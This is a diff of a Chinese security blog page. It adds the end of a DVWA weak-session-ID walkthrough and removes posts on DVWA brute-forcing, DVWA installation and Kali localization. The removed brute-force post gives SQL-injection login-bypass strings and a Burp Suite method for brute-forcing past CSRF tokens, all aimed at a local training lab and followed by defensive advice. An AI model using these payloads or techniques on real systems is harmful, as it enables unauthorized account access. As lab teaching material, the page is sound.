+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Cookie: dvwaSession=1&quot;</span> http://localhost:8080/...</span><br></pre></td></tr></table></figure>
+
+<p>这安全性跟没有一样。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 用时间戳当 Session ID：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>看 Cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1711683600</span><br><span class="line">dvwaSession=1711683605</span><br></pre></td></tr></table></figure>
+
+<p>看着挺长，其实就是 Unix 时间戳：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">timestamp = <span class="number">1711683600</span></span><br><span class="line"><span class="built_in">print</span>(datetime.datetime.fromtimestamp(timestamp))</span><br><span class="line"><span class="comment"># 2024-03-29 10:00:00</span></span><br></pre></td></tr></table></figure>
+
+<p>知道大概什么时候生成的，就能推算出 Session ID 范围，然后枚举。虽然比自增数字难搞一点，但还是能预测。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 用 <code>mt_rand()</code> 生成随机数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">mt_rand</span>( <span class="number">0</span>, <span class="number">9999999999</span> );</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span> );</span><br></pre></td></tr></table></figure>
+
+<p>范围是 0 到 9999999999，看着挺大，但 <code>mt_rand()</code> 是伪随机，知道种子就能推算出序列。</p>
+<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>收集一批 Session ID：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dvwaSession=1234567890</span><br><span class="line">dvwaSession=9876543210</span><br><span class="line">dvwaSession=5555555555</span><br></pre></td></tr></table></figure>
+
+<p>用统计工具分析规律，或者直接暴力枚举常见值。虽然没那么容易，但理论上还是能搞。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用加密安全的随机数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">sha1</span>( <span class="title function_ invoke__">uniqid</span>( <span class="title function_ invoke__">mt_rand</span>( <span class="number">0</span>, <span class="number">9999999999</span> ), <span class="literal">true</span> ) );</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>( <span class="string">&#x27;dvwaSession&#x27;</span>, <span class="variable">$session_id</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>, <span class="literal">true</span> );</span><br></pre></td></tr></table></figure>
+
+<p>特点：</p>
+<ol>
+<li><code>uniqid()</code> 加随机数生成唯一 ID</li>
+<li><code>sha1()</code> 哈希增加熵</li>
+<li>设置了 <code>HttpOnly</code> 和 <code>Secure</code> 属性</li>
+</ol>
+<p>这才是正确做法。</p>
+<h2 id="安全的-Session-ID-特征"><a href="#安全的-Session-ID-特征" class="headerlink" title="安全的 Session ID 特征"></a>安全的 Session ID 特征</h2><table>
+<thead>
+<tr>
+<th>特征</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>足够长</td>
+<td>至少 128 位</td>
+</tr>
+<tr>
+<td>随机</td>
+<td>用加密安全随机数生成器</td>
+</tr>
+<tr>
+<td>不可预测</td>
+<td>猜不出来下一个</td>
+</tr>
+<tr>
+<td>唯一</td>
+<td>不同会话不同 ID</td>
+</tr>
+<tr>
+<td>有有效期</td>
+<td>过期就失效</td>
+</tr>
+</tbody></table>
+<h2 id="Cookie-安全属性"><a href="#Cookie-安全属性" class="headerlink" title="Cookie 安全属性"></a>Cookie 安全属性</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HttpOnly</code></td>
+<td>JS 读不到，防 XSS 偷 Cookie</td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>只走 HTTPS</td>
+</tr>
+<tr>
+<td><code>SameSite</code></td>
+<td>限制跨站带 Cookie</td>
+</tr>
+<tr>
+<td><code>Path</code></td>
+<td>限制作用路径</td>
+</tr>
+<tr>
+<td><code>Domain</code></td>
+<td>限制作用域名</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Session ID 安全要点：</p>
+<ol>
+<li>用加密安全的随机数生成器，别用自增和时间戳</li>
+<li>ID 要够长，128 位起步</li>
+<li>Cookie 设置 HttpOnly 和 Secure</li>
+<li>重要操作后重新生成 Session ID</li>
+<li>设置合理的过期时间</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1505,374 +2103,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/04/DVWA-Brute-Force%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/04/DVWA-Brute-Force%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA Brute Force 暴力破解通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-04 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-04T10:00:00+08:00">2021-02-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Brute Force，说白了就是暴力破解。拿一堆账号密码挨个试，总有一个能蒙对的。虽然听着挺 low 的，但说实话很多系统还是会被这种方式攻破，尤其是那些密码设得简单的。</p>
-<p>这关主要用 Burp Suite 来搞，算是入门必备工具了。</p>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getid</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>好家伙，直接拼 SQL，连注入带爆破都能搞。</p>
-<h3 id="方法一：SQL-注入直接绕过"><a href="#方法一：SQL-注入直接绕过" class="headerlink" title="方法一：SQL 注入直接绕过"></a>方法一：SQL 注入直接绕过</h3><p>既然有注入，那还爆什么破，直接绕登录：</p>
-<p>用户名填 <code>admin&#39;#</code> 或者 <code>admin&#39; or &#39;1&#39;=&#39;1&#39;#</code>，密码随便填，直接进。</p>
-<p><img data-src="/images/pasted-90.png" alt="登录成功"></p>
-<h3 id="方法二：Burp-Suite-暴力破解"><a href="#方法二：Burp-Suite-暴力破解" class="headerlink" title="方法二：Burp Suite 暴力破解"></a>方法二：Burp Suite 暴力破解</h3><p>想练手 Burp Suite 的话，还是走爆破路线。</p>
-<p><strong>第一步：抓包</strong></p>
-<p>打开 DVWA 的 Brute Force 页面，随便输个账号密码，点登录。Burp 会把请求拦下来，右键选 <strong>Send to Intruder</strong>。</p>
-<p><img data-src="/images/pasted-91.png" alt="upload successful"></p>
-<p><strong>第二步：设置攻击点</strong></p>
-<p>进 Intruder -&gt; Positions，把预设的标记都清掉，然后选中用户名和密码这两个值，点 <strong>Add §</strong> 加标记：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=§admin§&amp;password=§123456§&amp;Login=Login</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pasted-92.png" alt="upload successful"></p>
-<p><strong>第三步：配置字典</strong></p>
-<p>切到 Payloads 选项卡：</p>
-<p>Payload set 1 填几个常见用户名：<code>admin</code>、<code>administrator</code>、<code>root</code>、<code>test</code></p>
-<p><img data-src="/images/pasted-93.png" alt="upload successful"></p>
-<p>Payload set 2 填密码，可以自己写几个常用的，也可以加载字典文件。</p>
-<p><img data-src="/images/pasted-94.png" alt="upload successful"></p>
-<p><strong>第四步：开跑</strong></p>
-<p>点 Start attack，等着就行。看 Length 这一列，响应长度不一样的那个就是成功了。</p>
-<p><img data-src="/images/pasted-95.png" alt="upload successful"></p>
-<p>跑出来用户名 <code>admin</code>，密码 <code>password</code>。</p>
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 级别加了个 <code>mysql_real_escape_string()</code> 转义特殊字符，还有个 <code>sleep(2)</code> 延迟：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass</span>);</span><br></pre></td></tr></table></figure>
-
-<p>注入是没法注入了，但爆破还是能爆，就是慢了点，每次都要等 2 秒。耐心点就行，反正又不是手工试。</p>
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别加了 CSRF Token，每次请求都要带上有效的 <code>user_token</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
-
-<p>这就麻烦了，普通的 Intruder 模式没法用，因为每次都要先获取新的 Token。</p>
-<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>用 Burp 的 <strong>Pitchfork</strong> 模式配合 <strong>Recursive grep</strong>。</p>
-<p><strong>第一步：设置攻击类型</strong></p>
-<p>攻击类型选 Pitchfork，标记密码和 token：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=§123456§&amp;Login=Login&amp;user_token=§token_here§</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pasted-96.png" alt="upload successful"></p>
-<p><strong>第二步：配置提取 Token</strong></p>
-<p>在 Options -&gt; Grep - Extract 里添加规则，从响应里提取 <code>user_token</code> 的值。</p>
-<p><img data-src="/images/pasted-97.png" alt="upload successful"></p>
-<p><strong>第三步：设置重定向</strong></p>
-<p>把 Follow redirections 改成 Always。</p>
-<p><img data-src="/images/pasted-99.png" alt="upload successful"></p>
-<p><strong>第四步：配置 Payload</strong></p>
-<p>第一个 Payload 用密码字典。</p>
-<p>第二个 Payload 类型选 <strong>Recursive grep</strong>，从上一个响应里提取 Token。</p>
-<p><img data-src="/images/pasted-98.png" alt="upload successful"></p>
-<p><strong>第五步：开跑</strong></p>
-<p>点开始，观察结果，找到对的密码。</p>
-<p><img data-src="/images/pasted-100.png" alt="upload successful"></p>
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别是真没法爆了：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$total_failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;total_failed_login&#x27;</span> ];</span><br><span class="line"><span class="variable">$lock_time</span>          = <span class="title function_ invoke__">strtotime</span>( <span class="variable">$row</span>[ <span class="string">&quot;last_login&quot;</span> ] ) + (<span class="number">15</span> * <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$total_failed_login</span> &gt;= <span class="number">3</span> &amp;&amp; <span class="title function_ invoke__">strtotime</span>( <span class="variable">$row</span>[ <span class="string">&quot;last_login&quot;</span> ] ) &gt; <span class="variable">$lock_time</span> ) &#123;</span><br><span class="line">    <span class="comment">// 账户被锁定</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>连续失败 3 次就锁 15 分钟，这就没法玩了。加上还有 CSRF Token、PDO 预处理、密码加密存储，这才是正确的安全姿势。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>暴力破解虽然听着土，但真挺有效的，尤其是那种密码设得简单还没防护的系统。做防护的话，记住几点：</p>
-<ul>
-<li>限制登录次数，失败几次就锁定</li>
-<li>加验证码</li>
-<li>强制强密码</li>
-<li>最好上个双因素认证</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/02/DVWA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/02/DVWA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA安装教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-02 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-02T10:00:00+08:00">2021-02-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学 Web 安全，发现 DVWA 这个靶场挺适合练手的。DVWA 全称是 Damn Vulnerable Web Application，说白了就是一个故意写满漏洞的 PHP 网站，专门用来让我们学习怎么发现和利用漏洞。</p>
-<p>不过有一点要注意，这玩意漏洞太多了，千万别部署到公网上去，我就放在本地的 Docker 里跑，安全第一。</p>
-<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-拉取镜像"><a href="#1-拉取镜像" class="headerlink" title="1. 拉取镜像"></a>1. 拉取镜像</h3><p>既然用 Docker，那就简单了，先拉个镜像：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
-
-<p>等几分钟就能拉下来。</p>
-<h3 id="2-启动容器"><a href="#2-启动容器" class="headerlink" title="2. 启动容器"></a>2. 启动容器</h3><p>然后跑起来：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3892:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
-
-<p>这里 <code>-d</code> 是后台运行，<code>-p 3892:80</code> 把容器里的 80 端口映射到本机的 3892 端口。端口随便改，只要没被占用就行。</p>
-<h3 id="3-访问测试"><a href="#3-访问测试" class="headerlink" title="3. 访问测试"></a>3. 访问测试</h3><p>打开浏览器访问 <code>http://localhost:3892</code>，应该能看到 DVWA 的界面了。</p>
-<p><img data-src="/images/pasted-89.png" alt="upload successful"></p>
-<h3 id="4-登录"><a href="#4-登录" class="headerlink" title="4. 登录"></a>4. 登录</h3><p>默认账号密码：</p>
-<ul>
-<li>用户名：admin</li>
-<li>密码：password</li>
-</ul>
-<p>登录进去就可以开始玩了。</p>
-<h2 id="安全级别说明"><a href="#安全级别说明" class="headerlink" title="安全级别说明"></a>安全级别说明</h2><p>DVWA 有四个安全级别，在左边菜单可以切换：</p>
-<table>
-<thead>
-<tr>
-<th>级别</th>
-<th>难度</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Low</td>
-<td>最简单，基本没防护，适合入门</td>
-</tr>
-<tr>
-<td>Medium</td>
-<td>有一点防护，但能绕过</td>
-</tr>
-<tr>
-<td>High</td>
-<td>防护比较强，需要点技巧</td>
-</tr>
-<tr>
-<td>Impossible</td>
-<td>安全编码的示范，基本没法攻破</td>
-</tr>
-</tbody></table>
-<p>建议从 Low 开始，一步步往上学，最后看看 Impossible 级别的代码是怎么写的，这才是正确的学习姿势。</p>
-<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><p>DVWA 有挺多漏洞模块的，后面我会一个个写通关教程：</p>
-<ul>
-<li>Brute Force（暴力破解）</li>
-<li>Command Injection（命令注入）</li>
-<li>CSRF（跨站请求伪造）</li>
-<li>File Inclusion（文件包含）</li>
-<li>File Upload（文件上传）</li>
-<li>Insecure CAPTCHA（不安全的验证码）</li>
-<li>SQL Injection（SQL 注入）</li>
-<li>SQL Injection Blind（盲注）</li>
-<li>Weak Session IDs（弱会话 ID）</li>
-<li>XSS DOM（DOM 型 XSS）</li>
-<li>XSS Reflected（反射型 XSS）</li>
-<li>XSS Stored（存储型 XSS）</li>
-<li>CSP Bypass（内容安全策略绕过）</li>
-<li>JavaScript（JavaScript 攻击）</li>
-</ul>
-<p>先装好环境，下一篇开始讲暴力破解。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/Kali-%E6%B1%89%E5%8C%96%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/Kali-%E6%B1%89%E5%8C%96%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Kali 汉化教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-01-12 23:50:00" itemprop="dateCreated datePublished" datetime="2021-01-12T23:50:00+08:00">2021-01-12</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <ol>
-<li><p>在 Kali 的桌面按下 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>T</kbd> 打开终端</p>
-</li>
-<li><p>使用 root 权限执行 <code>sudo dpkg-reconfigure locales</code><br>  <img src="/images/pasted-37.png" alt="upload successful"></p>
-</li>
-<li><p>选中 <strong>en_US.UTF-8 UTF-8</strong>  和  <strong>zh_CN.UTF-8 UTF-8</strong>  (注意:按下<strong>空格键</strong>选中,选好后按下<strong>TAB</strong>键退出编码格式选项,跳到<strong>OK选项</strong>)<br>  <img src="/images/pasted-38.png" alt="upload successful"></p>
-</li>
-<li><p>选择 <strong>zh_CN.UTF-8</strong>，选择OK<br> <img src="/images/pasted-39.png" alt="upload successful"></p>
-</li>
-<li><p>在终端键入<code>reboot</code>, 重启Kali<br>  <img src="/images/pasted-40.png" alt="upload successful"></p>
-</li>
-<li><p>重启Kali后, 建议选择<strong>保留旧的名称</strong><br>  <img src="/images/pasted-41.png" alt="upload successful"></p>
-</li>
-<li><p>此时可以看到界面已经汉化完成了!<br>  <img src="/images/pasted-42.png" alt="upload successful"></p>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/8/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/8/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
